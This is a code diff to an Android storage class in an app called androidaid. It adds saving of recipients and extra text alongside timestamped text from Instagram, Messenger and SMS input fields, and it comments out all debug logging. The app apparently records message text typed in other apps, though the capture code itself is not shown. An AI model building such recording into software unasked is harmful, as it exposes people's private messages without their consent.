@@ -10,6 +10,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.util.ArrayList;
 
+import androidaid.android.com.androidaid.core.ExtraConversationData;
 import androidaid.android.com.androidaid.core.FileUtils;
 import androidaid.android.com.androidaid.program_flow.Constants;
 import androidaid.android.com.androidaid.utilities.StringUtils;
@@ -71,9 +72,9 @@ public class InternalStorageManager {
 
             bw.close();
             outputStream.close();
-            System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " successful.");
+            //System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " successful.");
         } catch (Exception e) {
-            System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " FAILED!");
+            //System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " FAILED!");
             e.printStackTrace();
         }
     }
@@ -90,9 +91,39 @@ public class InternalStorageManager {
 
             bw.close();
             outputStream.close();
-            System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " successful.");
+            //System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " successful.");
         } catch (Exception e) {
-            System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " FAILED!");
+            //System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " FAILED!");
+            e.printStackTrace();
+        }
+    }
+
+    /**
+     * Stores text, recipient and extra text from the screen to the specified database location
+     * @param fileName
+     * @param text
+     * @param recipient
+     * @param extraText
+     */
+    public static void writeTextToFile(String fileName, String text, String recipient, String extraText) {
+        //System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Writing text to file " + fileName);
+        FileOutputStream outputStream;
+
+        String modifiedText = Constants.STORAGE_TEXT_STARTEND_SEPARATOR + text + Constants.STORAGE_TEXT_SEMISEPARATOR + recipient + Constants.STORAGE_TEXT_SEMISEPARATOR + extraText + Constants.STORAGE_TEXT_STARTEND_SEPARATOR ;
+
+        try {
+            outputStream = systemContext.openFileOutput(fileName, Context.MODE_APPEND); //this makes the file output string append (and not overwrite) data.
+
+            //outputStream.write(text.getBytes());
+            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(outputStream));
+            bw.newLine();
+            bw.write(modifiedText);
+
+            bw.close();
+            outputStream.close();
+            //System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " successful.");
+        } catch (Exception e) {
+            //System.out.println("[sproc32.storage.InternalStorageManager.writeTextToFile]: Write operation on file " + fileName + " FAILED!");
             e.printStackTrace();
         }
     }
@@ -103,7 +134,7 @@ public class InternalStorageManager {
      * @return
      */
     public static String readFromFile(String fileName) {
-        System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Reading from file: " + fileName);
+        //System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Reading from file: " + fileName);
 
         FileInputStream inputStream;
         try {
@@ -120,14 +151,14 @@ public class InternalStorageManager {
             return sb.toString();
 
         } catch (Exception e) {
-            System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Encountered an error while opening an input stream to file: " + fileName);
+            //System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Encountered an error while opening an input stream to file: " + fileName);
             e.printStackTrace();
             return null;
         }
     }
 
     public static String readFromFile(File file) {
-        System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Reading from file: " + file.getAbsolutePath());
+        //System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Reading from file: " + file.getAbsolutePath());
 
         FileInputStream inputStream;
         try {
@@ -145,7 +176,7 @@ public class InternalStorageManager {
             return sb.toString();
 
         } catch (Exception e) {
-            System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Encountered an error while opening an input stream to file: " + file.getAbsolutePath());
+            //System.out.println("[sproc32.storage.InternalStorageManager.readFromFile]: Encountered an error while opening an input stream to file: " + file.getAbsolutePath());
             e.printStackTrace();
             return null;
         }
@@ -157,14 +188,14 @@ public class InternalStorageManager {
      * @return
      */
     public static void deleteFileContents(String fileName) {
-        System.out.println("[sproc32.storage.InternalstorageManager.readFromFile]: Deleting file contents.");
+        //System.out.println("[sproc32.storage.InternalstorageManager.readFromFile]: Deleting file contents.");
         writeTextToFile(fileName, "", Context.MODE_PRIVATE);
     }
 
     //todo: in the future include also the recipient
     public static void writeToInstagramFieldTextFile(String dateAndTime, String text) {
         if(StringUtils.checkIfNotForbidden(text, Constants.DATABASE_FORBIDDEN_FIELD_TEXT_VALUES)) {
-            System.out.println("[sproc32.ISM]: Writing text '" + text + "' to instagram field text file.");
+            //System.out.println("[sproc32.ISM]: Writing text '" + text + "' to instagram field text file.");
             String modified = dateAndTime + Constants.STORAGE_TEXT_SEMISEPARATOR + text;
             writeTextToFile(Constants.STORAGE_FIELD_TEXT_INSTAGRAM, modified);
         }
@@ -172,17 +203,17 @@ public class InternalStorageManager {
 
     public static void writeToMessengerFieldTextFile(String dateAndTime, String text) {
         if (StringUtils.checkIfNotForbidden(text, Constants.DATABASE_FORBIDDEN_FIELD_TEXT_VALUES)) {
-            System.out.println("[sproc32.ISM]: Writing text '" + text + "' to messenger field text file.");
+            //System.out.println("[sproc32.ISM]: Writing text '" + text + "' to messenger field text file.");
             String modified = dateAndTime + Constants.STORAGE_TEXT_SEMISEPARATOR + text;
             writeTextToFile(Constants.STORAGE_FIELD_TEXT_MESSENGER, modified);
         }
     }
 
-    public static void writeToSMSFieldTextFile(String dateAndTime, String text) {
+    public static void writeToSMSFieldTextFile(String dateAndTime, String text, ExtraConversationData ecd) {
         if (StringUtils.checkIfNotForbidden(text, Constants.DATABASE_FORBIDDEN_FIELD_TEXT_VALUES)) {
-            System.out.println("[sproc32.ISM]: Writing text '" + text + "' to SMS field text file.");
+            //System.out.println("[sproc32.ISM]: Writing text '" + text + "' to SMS field text file.");
             String modified = dateAndTime + Constants.STORAGE_TEXT_SEMISEPARATOR + text;
-            writeTextToFile(Constants.STORAGE_FIELD_TEXT_SMS, modified);
+            writeTextToFile(Constants.STORAGE_FIELD_TEXT_SMS, modified, ecd.getRecipient(), ecd.getExtraText());
         }
     }
 
@@ -194,7 +225,7 @@ public class InternalStorageManager {
      */
     public static void writeToFieldTextGeneralFile(String dateAndTime, String text, String source) {
         if (StringUtils.checkIfNotForbidden(text, Constants.DATABASE_FORBIDDEN_FIELD_TEXT_VALUES)) {
-            System.out.println("[sproc32.ISM]: Writing text '" + text + "' from source '" + source + "' to general text file.");
+            //System.out.println("[sproc32.ISM]: Writing text '" + text + "' from source '" + source + "' to general text file.");
             String modified = source + Constants.STORAGE_TEXT_SEMISEPARATOR + dateAndTime + Constants.STORAGE_TEXT_SEMISEPARATOR + text;
             writeTextToFile(Constants.STORAGE_GENERAL_TEXT_FILE_LOCATION, modified);
         }
@@ -205,21 +236,21 @@ public class InternalStorageManager {
      * @return True, if all of the files on internal storage are empty. False otherwise.
      */
     public static boolean checkInternalStorageStateEmpty() {
-        System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: Checking internal storage space.");
+        //System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: Checking internal storage space.");
 
         boolean databaseIsEmpty = true;
 
         for (File file : getAllInternalStorageFiles()) {
             if(file.length() != 0) {
-                System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: Internal storage space isn't empty! File " + file.getAbsolutePath() + " contains some text. Other files may contain text as well!");
+                //System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: Internal storage space isn't empty! File " + file.getAbsolutePath() + " contains some text. Other files may contain text as well!");
                 databaseIsEmpty = false;
                 break;
             } else {
-                System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: File " + file.getAbsolutePath() + " is empty.");
+                //System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: File " + file.getAbsolutePath() + " is empty.");
             }
         }
 
-        System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: Returning " + databaseIsEmpty);
+        //System.out.println("[sproc32.InternalStorageManager.checkInternalStorageStateEmpty]: Returning " + databaseIsEmpty);
         return databaseIsEmpty;
     }
 
@@ -235,7 +266,7 @@ public class InternalStorageManager {
             files.add(file);
         }
 
-        System.out.println("[sproc32.InternalStoragemanager.getAllInternalStorageFiles]: Parsed internal storage files. Total files: " + files.size());
+        //System.out.println("[sproc32.InternalStoragemanager.getAllInternalStorageFiles]: Parsed internal storage files. Total files: " + files.size());
         return files;
     }
 }
